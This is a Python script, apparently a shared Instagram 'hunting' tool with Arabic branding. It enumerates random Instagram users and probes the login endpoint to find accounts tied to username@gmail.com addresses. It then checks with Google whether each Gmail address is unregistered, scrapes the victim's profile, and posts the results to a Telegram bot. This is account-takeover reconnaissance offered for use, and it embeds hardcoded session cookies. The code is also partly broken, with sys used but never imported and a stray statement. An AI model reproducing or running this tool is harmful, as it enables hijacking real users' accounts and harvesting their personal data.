import requests,random,threading,json,datetime,os

now = datetime.datetime.today()

now = datetime.datetime.today()

mm = str(now.month)

dd = str(now.day)

yyyy = str(now.year)

hour = str(now.hour)

mi = str(now.minute)

ss = str(now.second)

t=(mm + "/" + dd + "/" + yyyy + " " + hour+ ":" + mi + ":" + ss)

Z = '\033[1;31m' #احمر

hours = (now.hour)

x = datetime.datetime.now()

g= datetime.datetime(2023, 5, 5 , 00, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):

 print('\n\n')

 print('\n\n')

 print(x)

 

 sys.exit(0)

 

if (x.strftime("%x"))==(g.strftime("%x")):

   print('')

   if(x.strftime("%X"))>(g.strftime("%X")):

    print('\n')

    print('\n')

    print(x)

    i

    sys.exit(0)

   else:

    print('')  

else:

    print('')

print('')

os.system('clear')

Z = '\033[1;31m' #احمر

X = '\033[1;33m' #اصفر

F = '\033[2;32m' #اخضر

C = "\033[1;97m" #ابيض

B = '\033[2;36m'#سمائي

Y = '\033[1;34m' #ازرق فاتح.

C = "\033[1;97m" #ابيض

E = '\033[1;31m'

B = '\033[2;36m'

G = '\033[1;32m'

S = '\033[1;33m'

print(f'''                          {S} هــل مـــن مــنـافـس ''')

print(f'''  👨‍💻 {G}Tle {B}: {F}@PY_09''')

print('')

print(f'''{Z} [       {G} اســـتــمتع بوقـتـك {Z} ]''')

print('')

token=input(F+'ENTER TOKEN : '+Z)

ID=input(F+'ENTER ID : '+Z)

print(' ')

print(f'''{Z} [       {G} بـــداء الــــصــــيد  {Z} ]''')

print(' ')

def mo():

	userr=str("".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm._')for i in range(6)))	u=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={userr}&rank_token=0.7879925761258397&include_reel=true&search_surface=web_top_search'

	h={'cookie':'mid=ZB7v_gABAAHQj1UW08OhYPLj5rhE; ig_did=AEBAD102-B19F-4DAF-8F9D-3F3DC79B6F3D; ig_nrcb=1; dpr=2; datr=4O8eZJSW7WXWZowkiYAxNMLO; csrftoken=nEWGDQ4uwe7poeh4IE7FWuE8xhifPlg5; ds_user_id=59081976536; sessionid=59081976536:Bx2yLGabK32ByW:26:AYcXx7dds-4MMDuElpKPqKRZDWHkrANy8hzgdXy6EQ; rur="CLN\05459081976536\0541711787119:01f71c5276e1f0722a665812fd6590df9241152f102578d34018f805b477c73ef1607267"',

'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'}

	rrr=requests.get(u,headers=h).json()

	r=0

	while 1:

		r +=1

		try:

			user=str(rrr['users'][r]['user']['username'])

			email=user+"@gmail.com"

			url='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

			headers={

'accept': '*/*',

'accept-encoding': 'gzip, deflate, br',

'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',

'content-length': '418',

'content-type': 'application/x-www-form-urlencoded',

'cookie': 'mid=ZB7v_gABAAHQj1UW08OhYPLj5rhE; ig_did=AEBAD102-B19F-4DAF-8F9D-3F3DC79B6F3D; ig_nrcb=1; dpr=2; datr=4O8eZJSW7WXWZowkiYAxNMLO; csrftoken=o1j3Y6pG3nim6G9RZY0DlZRRQGqb3BCc',

'origin': 'https://www.instagram.com',

'referer': 'https://www.instagram.com/accounts/login/?source=auth_switcher',

'sec-ch-prefers-color-scheme': 'light',

'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',

'sec-ch-ua-mobile': '?0',

'sec-ch-ua-platform': '"Linux"',

'sec-fetch-dest': 'empty',

'sec-fetch-mode': 'cors',

'sec-fetch-site': 'same-origin',

'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',

'viewport-width': '980',

'x-asbd-id': '198387',

'x-csrftoken': 'o1j3Y6pG3nim6G9RZY0DlZRRQGqb3BCc','x-ig-app-id': '936619743392459',

'x-ig-www-claim': '0',

'x-instagram-ajax': '1007183526',

'x-requested-with': 'XMLHttpRequest',

}

			data={

		 		'enc_password':

		 			'#PWD_INSTAGRAM_BROWSER:10:1679926395:chchxj',

		 			'username': f'{email}',

		 			'optIntoOneTap': 'false',

		 			'trustedDeviceRecords': '{}',

}	

	

			rr=requests.post(url,headers=headers,data=data).text

			if '"message":"There was an error with your request. Please try again.","status":"fail"' in rr:

				print(f'{G} GOOD {Y}: {G} {email}')

				email=email.split('@')[0]+'@gmail.com'

				url = 'https://android.clients.google.com/setup/checkavail'

				h = {

		'Content-Length':'98',

		'Content-Type':'text/plain; charset=UTF-8',

		'Host':'android.clients.google.com',

		'Connection':'Keep-Alive',

		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',

		}

				d = json.dumps({

		'username':email,

		'version':'3',

		'firstName':'AbaLahb',

		'lastName':'AbuJahl'

	})

				res = requests.post(url,data=d,headers=h)

				if res.json()['status'] == 'SUCCESS':

					print(C+f'   GOOD Gmail : {email}')

					he = {

'accept': '*/*',

'accept-encoding': 'gzip, deflate, br',

'accept-language': 'ar',

'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',

'origin': 'https://www.instagram.com',

'referer': 'https://www.instagram.com/',

'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',

'sec-ch-ua-mobile': '?0',

'sec-ch-ua-platform': '"Windows"',

'sec-fetch-dest': 'empty',

'sec-fetch-mode': 'cors',

'sec-fetch-site': 'same-site',

'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',

'x-asbd-id': '198387',

'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',

'x-ig-app-id': '936619743392459',

'x-ig-www-claim': '0',

}

					urlg=f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}'

					re =requests.get(urlg,headers=he).json()

					bio = re["data"]["user"]["biography"]

					followers = re["data"]["user"]["edge_followed_by"]["count"]

					following = re["data"]["user"]["edge_follow"]["count"]

					name = re["data"]["user"]["full_name"]

					id = re["data"]["user"]["id"]

					posts = re["data"]["user"]["edge_owner_to_timeline_media"]["count"]

					date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]

					tlg = f"""

{G}⌯ افرح محمد جابلك متاح انستا  ✅ ⌯ 

. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .

[💔] NAME ➥ {name}

[👻] Username ➥ {user}

[💝] EMAIL ➥ {user}@gmail.com

[👥] Followers ➥ {followers}

[🗣] Following ➥ {following}

[🆔] ID ➥ {id}

[👻] BIO ➥ {bio}

[💞] POSTS ➥ {posts}

[⏱] Data ➥ {date}

. ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ .

⚖️ Tele : @PY_09 ✓ @PY_09

"""

					print(tlg)

					requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(tlg))

				else:

					print(Y+f'   Error Gmail : {email}')

			else:

				print(f'{S} Fales {B}: {Z} {email}')

		

		except:

			mo()

prox_list=[]

for i in range(8):

	t = threading.Thread(target=mo)

	t.start()

	prox_list.append(t) 			

mo()			

	
